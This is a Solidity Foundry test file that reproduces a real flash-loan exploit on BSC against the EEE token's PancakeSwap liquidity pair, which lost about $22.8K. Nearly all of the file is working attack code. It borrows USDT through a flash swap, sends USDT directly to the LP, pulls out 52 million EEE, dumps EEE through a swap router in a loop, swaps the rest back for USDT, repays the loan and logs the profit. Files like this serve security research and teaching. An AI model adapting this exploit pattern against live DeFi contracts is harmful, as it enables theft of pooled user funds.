// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$22.8K
// Attacker : https://bscscan.com/address/0xb06d402705ad5156b42e4279903cbd7771cf59c9
// Attack Contract : https://bscscan.com/address/0x9a16b5375e79e409a8bfdb17cfe568e533c2d7c5
// Vulnerable Contract : https://bscscan.com/address/0x0506e571aba3dd4c9d71bed479a4e6d40d95c833
// Attack Tx : https://bscscan.com/tx/0x7312d9f9c13fc69f00f58e92a112a3e7f036ced7e65f7e0fa67382488d5557dc

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x0506e571aba3dd4c9d71bed479a4e6d40d95c833#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 

// @Other Findings
// address 0xde19b6f4eaaf3a897d1b190d37c86d6ef3b24d02 gained 9,358,702 EEE Token
// address 0xe568a4ce2eb77d230e1473d2cfd5b5e2129f69a8 gained 18K USD
// address 0xfef7b2b4fd8f9fdca24713999a5e76c044ccfc0d gained 27K USD

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IPancakePool {
    function swap(uint, uint, address, bytes calldata) external;
}

interface IAttackRouter {
    function swap(address, uint256) external;
}

contract ContractTest is Test {
    IPancakePool pancake = IPancakePool(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
    IERC20 usdt = IERC20(payable(usdtAddress));
    IPancakePair pair = IPancakePair(0x5813d7818c9d8F29A9a96B00031ef576E892DEf4);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address cake_LP = 0x0506e571ABa3dD4C9d71bEd479A4e6d40d95C833;
    address EEE = 0x297f3996Ce5C2Dcd033c77098ca9e1acc3c3C3Ee;
    address swap_router = 0x5002F2D9Ac1763F9cF02551B3A72a42E792AE9Ea;


    function setUp() external {
        cheats.createSelectFork("bsc", 33940984-1);
    }

    function testExploit() external {
        uint256 before = usdt.balanceOf(address(this));
        emit log_named_uint("[Begin] Attacker USDT before exploit", before);
        address me = address(this);
        pancake.swap(750000000000000000000000, 0, me, "0x00");
        uint256 after_attack = usdt.balanceOf(address(this));
        emit log_named_uint("[End] Attacker USDT after exploit", after_attack);
        emit log_named_uint("[End] Profit in $", (after_attack-before)/1e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        usdt.transfer(cake_LP, amount0); // transfer usdt to the LP, surging the usdt supply

        uint256 EEE_amount = 52000000000000000000000000;
        IPancakePool(cake_LP).swap(EEE_amount, 0, address(this), ""); // get EEE
        IERC20(EEE).approve(swap_router, 100000000000000000000000000000000);

        // swap EEE to USDT
        IAttackRouter(swap_router).swap(EEE, 3000000000000000000000000);
        uint8 index = 0;
        while (index < 8) {
            IAttackRouter(swap_router).swap(EEE, 800000000000000000000000);
            index++;
        }

        IERC20(EEE).transfer(cake_LP, IERC20(EEE).balanceOf(address(this))); // transfer directly to the LP

        IPancakePool(cake_LP).swap(0, 188300000000000000000000, address(this), ""); // swap EEE to USDT
        usdt.transfer(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0, 751950000000000000000000); // payback

    }

    fallback() external payable {}
}
